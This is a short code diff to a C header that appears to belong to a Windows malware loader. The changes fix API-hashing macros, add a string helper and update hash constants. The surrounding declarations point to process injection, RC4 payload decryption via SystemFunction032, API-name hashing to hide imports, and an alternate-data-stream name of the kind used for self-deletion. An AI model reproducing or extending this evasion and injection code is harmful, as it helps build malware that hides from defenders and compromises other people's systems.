@@ -9,7 +9,7 @@
 
 // Real time hashing function
 #define RTIME_HASHA(API) HashStringRotr32A((LPCSTR) API)
-#define RTIME_HASHW(API) HashStringRotr32A((LPCSTR) API)
+#define RTIME_HASHW(API) HashStringRotr32W((LPCWSTR) API)
 
 // New alternate datastream name
 #define NEW_STREAM L":DummyStream"
@@ -601,6 +601,7 @@ SIZE_T StringLengthW(IN LPCWSTR String);
 INT StringCompareA(IN LPCSTR String1, IN LPCSTR String2);
 BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);
 UINT32 HashStringRotr32W(LPCWSTR String);
+LPCSTR LowerCaseStringA(IN LPCSTR str);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
@@ -646,7 +647,7 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 #define CreateFileWHashValue					0x94E432A9
 #define SetFileInformationByHandleHashValue     0xEBF511FC
 #define USER32DLLHashValue						0x5644677D
-#define KERNEL32DLLHashValue					0x954ADD0F
+#define KERNEL32DLLHashValue					0xEC1C6278
 
 typedef struct _API_HASHING {
 
